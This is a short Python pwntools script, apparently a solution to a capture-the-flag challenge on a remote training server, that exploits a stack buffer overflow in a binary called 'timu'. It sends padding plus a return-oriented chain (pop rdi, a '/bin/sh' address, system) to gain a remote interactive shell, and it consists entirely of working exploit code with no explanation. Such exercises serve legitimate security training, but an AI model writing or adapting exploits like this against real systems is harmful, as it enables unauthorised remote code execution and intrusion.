from pwn import *
#sh=process("./timu")
sh=remote("node4.buuoj.cn",26303)
elf=ELF("./timu")

bin_sh=p64(0x0000000000601048)
pop_rdi_ret=p64(0x0000000000400683)
system_addr=p64(0x00000000004005E3)

payload=0x18*b'a'+pop_rdi_ret+bin_sh+system_addr
sh.sendline(payload)
sh.interactive()
